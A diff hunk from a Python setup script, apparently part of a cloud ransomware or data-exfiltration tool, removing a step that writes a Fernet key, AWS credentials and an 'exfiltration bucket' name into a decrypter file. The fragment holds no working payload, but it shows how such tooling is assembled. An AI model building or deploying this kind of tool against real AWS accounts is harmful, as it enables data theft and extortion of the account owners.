@@ -133,22 +133,6 @@ aws_lambda.create_function(
         MemorySize = 512 
         )
 
-
-#######Decrypter setup
-print("Decrypter setup...")
-#------------------Modifying data------------------
-with open('decrypter.py','r') as f:
-	lines = f.readlines()
-	#print(lines)
-with open('decrypter.py','w') as f:
-	lines.insert(9, str("key = " + "b" + "'" + fernet_key.decode() + "'\n"))
-	lines.insert(10, str("aws_access_key_id = " + "'" + aws_access_key + "'\n"))
-	lines.insert(11, str("aws_secret_access_key = " + "'" + aws_secret_access_key + "'\n"))
-	lines.insert(12, str("region = " + "'" + region_name + "'\n"))
-	lines.insert(13, str("exfiltration_bucket_name = " + "'" + exfiltration_bucket_name + "'\n"))
-	f.write("".join(lines))
-
-
 #######Standalone Client
 print("Client setup...")
 #------------------standaloneClient template------------------
